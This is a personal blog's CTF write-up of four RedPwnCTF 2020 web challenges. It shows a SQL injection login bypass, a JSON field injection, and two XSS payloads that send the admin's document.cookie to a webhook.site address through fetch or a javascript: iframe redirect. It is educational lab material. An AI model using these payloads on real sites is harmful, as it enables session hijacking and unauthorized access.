@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="Jamie Polintan ">
+<meta name="description" content="RedPwnCTF 2020 is a beginner to intermediate CTF that&amp;rsquo;s accessible to high school and college students. The CTF featured a range of easy to harder problems, which provided both a good introduction into CTFs and an opportunity to stretch your pre-established skills. I solved through a good portion of the web problems, and will document a few of the ones here.
+Let&amp;rsquo;s Begin! The problems are in no way ordered in terms of difficulty." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="#252627" />
+<link rel="canonical" href="https://jamvie.net/post/08redpwn2020/" />
+
+
+    <title>
+        
+            RedPwnCTF 2020 :: Jam Polintan 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://jamvie.net/main.dede02da9537a98158079c023e83573e18127834838ef08172acce888341a797.css">
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://jamvie.net/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://jamvie.net/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://jamvie.net/favicon-16x16.png">
+    <link rel="manifest" href="https://jamvie.net/site.webmanifest">
+    <link rel="mask-icon" href="https://jamvie.net/safari-pinned-tab.svg" color="#252627">
+    <link rel="shortcut icon" href="https://jamvie.net/favicon.ico">
+    <meta name="msapplication-TileColor" content="#252627">
+    <meta name="theme-color" content="#252627">
+
+
+
+<meta itemprop="name" content="RedPwnCTF 2020">
+<meta itemprop="description" content="RedPwnCTF 2020 is a beginner to intermediate CTF that&rsquo;s accessible to high school and college students. The CTF featured a range of easy to harder problems, which provided both a good introduction into CTFs and an opportunity to stretch your pre-established skills. I solved through a good portion of the web problems, and will document a few of the ones here.
+Let&rsquo;s Begin! The problems are in no way ordered in terms of difficulty.">
+<meta itemprop="datePublished" content="2020-06-25T16:26:44-06:00" />
+<meta itemprop="dateModified" content="2020-06-25T16:26:44-06:00" />
+<meta itemprop="wordCount" content="1139">
+<meta itemprop="image" content="https://jamvie.net/images/REDPWN2020_LoginPage.png">
+
+
+
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://jamvie.net/images/REDPWN2020_LoginPage.png"/>
+
+<meta name="twitter:title" content="RedPwnCTF 2020"/>
+<meta name="twitter:description" content="RedPwnCTF 2020 is a beginner to intermediate CTF that&rsquo;s accessible to high school and college students. The CTF featured a range of easy to harder problems, which provided both a good introduction into CTFs and an opportunity to stretch your pre-established skills. I solved through a good portion of the web problems, and will document a few of the ones here.
+Let&rsquo;s Begin! The problems are in no way ordered in terms of difficulty."/>
+
+
+
+    <meta property="og:title" content="RedPwnCTF 2020" />
+<meta property="og:description" content="RedPwnCTF 2020 is a beginner to intermediate CTF that&rsquo;s accessible to high school and college students. The CTF featured a range of easy to harder problems, which provided both a good introduction into CTFs and an opportunity to stretch your pre-established skills. I solved through a good portion of the web problems, and will document a few of the ones here.
+Let&rsquo;s Begin! The problems are in no way ordered in terms of difficulty." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://jamvie.net/post/08redpwn2020/" />
+<meta property="og:image" content="https://jamvie.net/images/REDPWN2020_LoginPage.png" />
+<meta property="article:published_time" content="2020-06-25T16:26:44-06:00" />
+<meta property="article:modified_time" content="2020-06-25T16:26:44-06:00" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2020-06-25 16:26:44 -0600 MDT" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://jamvie.net/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">$ echo hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://jamvie.net/about/">About Me</a></li><li><a href="https://jamvie.net/post/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://jamvie.net/post/08redpwn2020/">RedPwnCTF 2020</a></h2>
+
+            
+
+            <div class="post-content">
+                <p>RedPwnCTF 2020 is a beginner to intermediate CTF that&rsquo;s accessible to high school and college students. The CTF featured a range of easy to harder problems, which provided both a good introduction into CTFs and an opportunity to stretch your pre-established skills. I solved through a good portion of the web problems, and will document a few of the ones here.</p>
+<h2 id="lets-begin">Let&rsquo;s Begin!</h2>
+<p>The problems are in no way ordered in terms of difficulty.</p>
+<h3 id="login">login</h3>
+<ul>
+<li>points: 148</li>
+</ul>
+
+    <img src="https://jamvie.net/images/REDPWN2020_LoginPage.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>A simple login page - a sign for sql injection attacks. Consider the provided script:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">global</span>.<span style="color:#a6e22e">__rootdir</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">__dirname</span>;
+
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>);
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">bodyParser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;body-parser&#39;</span>);
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cookieParser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;cookie-parser&#39;</span>);
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">path</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;path&#39;</span>);
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">db</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;better-sqlite3&#39;</span>)(<span style="color:#e6db74">&#39;db.sqlite3&#39;</span>);
+
+<span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;dotenv&#39;</span>).<span style="color:#a6e22e">config</span>();
+
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">bodyParser</span>.<span style="color:#a6e22e">json</span>({ <span style="color:#a6e22e">extended</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span> }));
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">cookieParser</span>());
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/api/flag&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">username</span>;
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">password</span>;
+    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;string&#39;</span>) {
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>);
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
+        <span style="color:#66d9ef">return</span>;
+    }
+    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;string&#39;</span>) {
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>);
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
+        <span style="color:#66d9ef">return</span>;
+    }
+
+    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result</span>;
+    <span style="color:#66d9ef">try</span> {
+        <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">`SELECT * FROM users 
+</span><span style="color:#e6db74">            WHERE username = &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">username</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;
+</span><span style="color:#e6db74">            AND password = &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">password</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;;`</span>).<span style="color:#a6e22e">get</span>();
+    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({ <span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>, <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;There was a problem.&#34;</span> });
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
+        <span style="color:#66d9ef">return</span>;
+    }
+    
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">result</span>) {
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({ <span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>, <span style="color:#a6e22e">flag</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">FLAG</span> });
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
+        <span style="color:#66d9ef">return</span>;
+    }
+
+    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({ <span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>, <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Incorrect username or password.&#34;</span> });
+});
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">express</span>.<span style="color:#66d9ef">static</span>(<span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">__dirname</span>, <span style="color:#e6db74">&#39;/public&#39;</span>)));
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">PORT</span> <span style="color:#f92672">||</span> <span style="color:#ae81ff">3000</span>);
+
+<span style="color:#75715e">// init database
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">`CREATE TABLE IF NOT EXISTS users (
+</span><span style="color:#e6db74">    id INTEGER PRIMARY KEY AUTOINCREMENT,
+</span><span style="color:#e6db74">    username TEXT,
+</span><span style="color:#e6db74">    password TEXT);`</span>).<span style="color:#a6e22e">run</span>();
+
+<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">`INSERT INTO 
+</span><span style="color:#e6db74">    users (username, password)
+</span><span style="color:#e6db74">    VALUES (&#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">USERNAME</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;, &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">PASSWORD</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;);`</span>).<span style="color:#a6e22e">run</span>();
+
+</code></pre></div><p>In the post request to api/flag, our username and password input are fed directly into the database, which is sqlite-based.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">   <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result</span>;
+    <span style="color:#66d9ef">try</span> {
+        <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">`SELECT * FROM users 
+</span><span style="color:#e6db74">            WHERE username = &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">username</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;
+</span><span style="color:#e6db74">            AND password = &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">password</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;;`</span>).<span style="color:#a6e22e">get</span>();
+    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({ <span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>, <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;There was a problem.&#34;</span> });
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
+        <span style="color:#66d9ef">return</span>;
+    }
+    
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">result</span>) {
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({ <span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>, <span style="color:#a6e22e">flag</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">FLAG</span> });
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
+        <span style="color:#66d9ef">return</span>;
+    }
+</code></pre></div><p>Using the following credentials:</p>
+<pre><code>username: admin
+password:  ' OR '1==1
+</code></pre><p>We malform the SQL query in the password field - including a tautology so the statement will return true. The resulting SQL will look like:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> users
+    <span style="color:#66d9ef">WHERE</span> username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;admin&#39;</span>
+    <span style="color:#66d9ef">AND</span> password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#66d9ef">OR</span> <span style="color:#e6db74">&#39;1==1&#39;</span>;
+</code></pre></div>
+    <img src="https://jamvie.net/images/REDPWN2020_LoginFlag.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />
+
+
+<h3 id="static-pastebin">static-pastebin</h3>
+<ul>
+<li>points: 378</li>
+</ul>
+
+    <img src="https://jamvie.net/images/REDPWN2020_StaticPastebin.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>The site will take our input, feed it through a clean() function loaded from a script on the client-end, and then paste the &ldquo;cleaned&rdquo; text into an HTML div tag known as &ldquo;paste&rdquo;.</p>
+<pre><code>function display(input) {
+    document.getElementById('paste').innerHTML = clean(input);
+}
+
+function clean(input) {
+    let brackets = 0;
+    let result = '';
+    for (let i = 0; i &lt; input.length; i++) {
+        const current = input.charAt(i);
+        if (current == '&lt;') {
+            brackets ++;
+        }
+        if (brackets == 0) {
+            result += current;
+        }
+        if (current == '&gt;') {
+            brackets --;
+        }
+    }
+    return result
+}
+</code></pre><p>Observe that clean() &ldquo;filters&rdquo; out potential xss attempts by removing anything within <code>&lt;&gt;</code> brackets. However, the function does this by consulting a <code>brackets</code> variable, which is expected to either take 0 or 1. However, the order of the if statements are important - if the first character is <code>&gt;</code>, then <code>brackets</code> will remain as 0 through the first and second if-statement checks - specifically on the 2nd check, <code>&gt;</code> is recorded. When it reaches the third, then <code>brackets</code> becomes -1. If the 2nd character after <code>&gt;</code> is <code>&lt;</code>, the opening angular bracket, the first check changes brackets back to 0 and <code>&lt;</code> is also recorded. Therefore, <code>&lt;&gt;</code> will not show in the page, but <code>&gt;&lt;</code> will. We can use this fact to smuggle our tags through - for every angular bracket, turn it into a <code>&gt;&lt;</code> pair.</p>
+<p>The rest of the problem is a classic reflected xss attack. Using an HTML <code>img</code> attribute, grab the document cookie and have it sent to your server.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&gt;&lt;<span style="color:#f92672">img</span> 
+    <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://this.isnt.a/real.site&#34;</span> 
+    <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;fetch(
+</span><span style="color:#e6db74">        &#39;https://webhook.site/31b4faf3-e6e6-44af-9d7d-196e18bcaed4&#39;, {
+</span><span style="color:#e6db74">            method:&#39;POST&#39;, 
+</span><span style="color:#e6db74">            body: JSON.stringify({data:document.cookie})
+</span><span style="color:#e6db74">        }
+</span><span style="color:#e6db74">    );&#34;</span>&gt;<span style="color:#960050;background-color:#1e0010">&lt;</span>
+</code></pre></div><p>Input this, we will get a broken image, but inspecting the page will show that our <code>img</code> tag has sucessfully been interpreted as HTML. Additionally, we will get a ping on our server once the page loads. Report the URL of the page, and once the admin bot checks, we will get the flag sent to our server.</p>
+
+    <img src="https://jamvie.net/images/REDPWN2020_StaticPastebinFlag.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />
+
+
+<h3 id="panda-facts">Panda-Facts</h3>
+<ul>
+<li>points: 417</li>
+</ul>
+
+    <img src="https://jamvie.net/images/REDPWN2020_PandaFacts.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Register and see some pretty anti-panda facts. At the bottom is a secret fact that will bar anyone who isn&rsquo;t a member. The challenge&rsquo;s provided script reveals the check:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">...
+
+<span style="color:#a6e22e">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">generateToken</span>(<span style="color:#a6e22e">username</span>) {
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">algorithm</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;aes-192-cbc&#39;</span>; 
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">KEY</span>, <span style="color:#e6db74">&#39;hex&#39;</span>); 
+    <span style="color:#75715e">// Predictable IV doesn&#39;t matter here
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">iv</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">alloc</span>(<span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">0</span>);
+
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cipher</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">createCipheriv</span>(<span style="color:#a6e22e">algorithm</span>, <span style="color:#a6e22e">key</span>, <span style="color:#a6e22e">iv</span>);
+
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`{&#34;integrity&#34;:&#34;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">INTEGRITY</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;,&#34;member&#34;:0,&#34;username&#34;:&#34;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">username</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;}`</span>
+
+    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">encrypted</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+    <span style="color:#a6e22e">encrypted</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">cipher</span>.<span style="color:#a6e22e">update</span>(<span style="color:#a6e22e">token</span>, <span style="color:#e6db74">&#39;utf8&#39;</span>, <span style="color:#e6db74">&#39;base64&#39;</span>);
+    <span style="color:#a6e22e">encrypted</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">cipher</span>.<span style="color:#66d9ef">final</span>(<span style="color:#e6db74">&#39;base64&#39;</span>);
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">encrypted</span>;
+}
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/api/flag&#39;</span>, <span style="color:#a6e22e">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">cookies</span>.<span style="color:#a6e22e">token</span> <span style="color:#f92672">||</span> <span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">cookies</span>.<span style="color:#a6e22e">token</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;string&#39;</span>) {
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({<span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>, <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Invalid token&#39;</span>});
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
+        <span style="color:#66d9ef">return</span>;
+    }
+
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">decodeToken</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">cookies</span>.<span style="color:#a6e22e">token</span>);
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">result</span>) {
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({<span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>, <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Invalid token&#39;</span>});
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
+        <span style="color:#66d9ef">return</span>;
+    }
+
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">member</span>) {
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({<span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>, <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;You are not a member&#39;</span>});
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
+        <span style="color:#66d9ef">return</span>;
+    }
+
+    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({<span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>, <span style="color:#a6e22e">flag</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">FLAG</span>});
+});
+
+...
+</code></pre></div><p>The member field for us is 0. However, observe that the generateToken() function feeds our username input unsanitized to be used by other functions.
+If we make our username overwrite the first assignment to the member field, we can bypass the member check.</p>
+<p>I inputted this as my username:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">jam</span><span style="color:#e6db74">&#34;, &#34;</span><span style="color:#960050;background-color:#1e0010">member</span><span style="color:#e6db74">&#34;:1, &#34;</span><span style="color:#960050;background-color:#1e0010">ignore</span><span style="color:#e6db74">&#34;:&#34;</span>
+</code></pre></div><p>This malforms the <code>token</code> variable into:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`{&#34;integrity&#34;:&#34;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">INTEGRITY</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;,&#34;member&#34;:0,&#34;username&#34;:&#34;jam&#34;, &#34;member&#34;:1, &#34;ignore&#34;:&#34;&#34;}`</span>
+</code></pre></div><p>We overwrite the initial member assignment to the value we want.</p>
+<p>Clicking on the secret fact presents the flag.</p>
+
+    <img src="https://jamvie.net/images/REDPWN2020_PandaFactsFlag.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />
+
+
+<h3 id="static-static-hosting">Static-static-hosting</h3>
+<ul>
+<li>points: 434</li>
+</ul>
+<p>Same idea as the problem &ldquo;Static-Pastebin&rdquo;: try and put an xss attack in the site. However, they filter <code>&lt;script&gt;</code> tags.</p>
+<pre><code>function sanitize(element) {
+    const attributes = element.getAttributeNames();
+    for (let i = 0; i &lt; attributes.length; i++) {
+        // Let people add images and styles
+        if (!['src', 'width', 'height', 'alt', 'class'].includes(attributes[i])) {
+            element.removeAttribute(attributes[i]);
+        }
+    }
+
+    const children = element.children;
+    for (let i = 0; i &lt; children.length; i++) {
+        if (children[i].nodeName === 'SCRIPT') {
+            element.removeChild(children[i]);
+            i --;
+        } else {
+            sanitize(children[i]);
+        }
+    }
+}
+</code></pre><p>Tried to use my <code>&lt;img&gt;</code>-based payload from before but it didn&rsquo;t ping my server when I visited it, as I believe it removes the <code>onerror()</code> function.</p>
+<p>However, there still exists different ways to inject an xss payload. As an example, an <code>&lt;iframe&gt;</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript:alert(&#39;Hello&#39;)&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+</code></pre></div><p>This prompts an alert. <code>&lt;iframe&gt;</code> elements can be used to smuggle our xss payload.</p>
+
+    <img src="https://jamvie.net/images/REDPWN2020_StaticV2Alert.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Use this payload to send a GET request to your server that steals admin cookies:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript:document.location=&#39;https://webhook.site/31b4faf3-e6e6-44af-9d7d-196e18bcaed4?data=&#39;+document.cookie&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+</code></pre></div><p>Report the created page to the admin. Wait for it to ping your server.</p>
+
+    <img src="https://jamvie.net/images/REDPWN2020_StaticV2Flag.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />
+
+
+<h2 id="summary">Summary</h2>
+<p>The collection of problems I showcased here were good opportunities to reinforce my websploit skills! They all involved classic forms of attacks which is common to see in most, if not all, CTFs. I will soon discuss the more unique and creative problems I saw in RedPwnCTF 2020!</p>
+<p>Jam</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2020</span>
+            
+                <span><a href="https://jamvie.net">Jamie Polintan</a></span>
+            
